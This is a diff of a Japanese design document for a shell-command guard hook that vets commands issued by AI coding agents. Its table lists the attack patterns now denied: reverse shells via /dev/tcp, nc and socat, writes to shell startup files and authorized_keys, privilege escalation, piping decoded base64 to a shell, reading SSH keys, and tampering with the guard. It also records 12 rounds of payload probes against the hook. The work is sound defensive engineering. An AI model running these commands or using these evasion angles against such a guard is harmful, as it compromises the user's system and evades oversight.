@@ -166,10 +166,25 @@ Claude tool 名に変わる。`^bash$` は `Bash` にマッチしない。両対
 | エディタ・REPL 経由の間接実行 (`vim` の `:!` など) | **未対応** |
 | ネスト 2 段以上のコマンド置換 | **未対応**。正規表現で追えるのは 1 段まで |
 | 設定ファイル側で定義された名前の実行 (`pre-commit run <hook-id>` など) | **未対応**。実体はリポジトリの設定次第で静的に追えない |
-| エンコードされたコマンド (`printf '\x67\x69\x74'`、base64 の復号結果) | **未対応**。復号結果は静的に追えない |
+| `bash -i >& /dev/tcp/host/port` / `nc -e` / `socat EXEC:` / `nc -lvp` | **修正済**: `check_reverse_shell` が組み込みの TCP リダイレクトと実行系・待ち受け系フラグを deny |
+| シェル起動ファイルへの追記 (`~/.bashrc` / `~/.zshrc` / `~/.ssh/authorized_keys`) | **修正済**: `check_shell_startup_write` が書き込みだけを deny (読み取りは許可) |
+| `chmod u+s` / `usermod -aG sudo` / `passwd root` / `/etc/sudoers` | **修正済**: `check_privilege_escalation` が setuid 付与とアカウント操作を deny |
+| デコード結果の直接実行 (`base64 -d` / `xxd -r` をシェルにパイプ) | **修正済**: `check_encoded_command` が deny |
+| `PYTHONPATH=/tmp/evil` / `AGENTS_CONFIG_DIR=/tmp/fake` | **修正済**: hook の読み込み先を差し替える環境変数を deny (リポジトリ内の `PYTHONPATH` は許可) |
+| `systemd-run --user` / `systemctl --user enable` | **修正済**: `systemctl` はサブコマンド単位で deny (`status` / `show` は許可)、`systemd-run` は deny |
+| `docker volume prune` / `npm cache clean` / `aws s3 cp` / `gh release upload` | **修正済**: 復旧に時間がかかる削除と外部への転送経路を deny |
+| センシティブディレクトリの列挙 (`ls` / `find` / `git diff` の引数) | **修正済**: 列挙系コマンドと `git diff`/`show`/`blame` の引数も判定対象 |
+| `chezmoi forget` / `unlink` によるガード設定の除去 | **修正済**: `check_guard_tampering` の対象コマンドに追加 |
+| `cd ~/.ssh && cat id_rsa` / `cat $HOME/.ssh/*` / `cat ~/.ss?/id_rsa` | **修正済**: `expand_cd_targets` が cd 先を結合した変種も検査し、`$HOME` とワイルドカードもセンシティブ判定に含む |
+| `git config alias.p push` / `credential.helper` / `core.sshCommand` | **修正済**: `check_git_config_write` が任意コマンド実行に繋がる設定キーを deny |
+| `.git/config` / `.git/hooks` の直接書き換え | **修正済**: `check_guard_tampering` の対象に追加 |
+| `command git push` / `exec git push` / `'git' push` / `parallel` / `while read` | **修正済**: 組み込み前置・引用・並列実行も normalize が剥がす |
+| ドキュメント中のコマンド例 (`cat <<'EOF' > note.md` の本文) による誤検知 | **修正済**: `split_heredoc_body` が実行されない heredoc 本文を検査対象から外す |
+| `python3 - <<'PY'` の heredoc 本文からの外部実行 | **修正済**: インタプリタに渡る heredoc 本文はインラインコードとして検査する |
+| エンコードされたコマンド (`printf` のエスケープ列、base64 の復号結果) を変数経由で組み立てる形 | **未対応**。復号結果は静的に追えない |
 
 上記の「修正済」は `test/agents/test_check_bash_decision.py` と
-`test_command_policy.py` に回帰テストがある (499 件)。日常的に使うコマンド
+`test_command_policy.py` に回帰テストがある (613 件)。日常的に使うコマンド
 (`bash test/test.sh` / `timeout 900 chezmoi apply` / `grep -rn token .` /
 `cp .env.example .env` / `git commit -m "fix token refresh"` /
 `docker run --rm alpine echo hi` / `npm run build` / `mise exec -- shellcheck x.sh` /
@@ -177,7 +192,7 @@ Claude tool 名に変わる。`^bash$` は `Bash` にマッチしない。両対
 
 ### 検証の進め方
 
-配備済み hook に payload を流す probe を角度を変えて 5 巡実施し、
+配備済み hook に payload を流す probe を角度を変えて 12 巡実施し、
 各巡で見つかった素通りを塞いでから回帰テストに固定した。
 
 | 巡 | 観点 | 発見 |
@@ -189,7 +204,11 @@ Claude tool 名に変わる。`^bash$` は `Bash` にマッチしない。両対
 | 5 | ツールランナー・遅延実行・デバイス破壊 | 44 中 24 件 |
 | 6 | hook 自体の堅牢性 (不正入力・処理時間) | 21 中 8 件 |
 | 7 | 設定の壊れ方・Copilot 側のペイロード | 16 中 4 件 |
-| 8 | 制御構文・trap・ファイル情報コマンド (収束確認) | 46 中 15 件 |
+| 8 | 制御構文・trap・ファイル情報コマンド | 46 中 15 件 |
+| 9 | 多段ラッパー・prune・列挙・クラウド転送 | 46 中 12 件 |
+| 10 | リバースシェル・権限昇格・永続化・エンコード | 47 中 13 件 |
+| 11 | heredoc 本文の扱い | 9 中 3 件 |
+| 12 | パス難読化・cd 経由の相対参照・git config (収束確認) | 37 中 3 件 |
 
 いずれの巡でも「正当なコマンドが過剰検知されないこと」を同時に測り、
 両方が 0 件になるまで繰り返した。
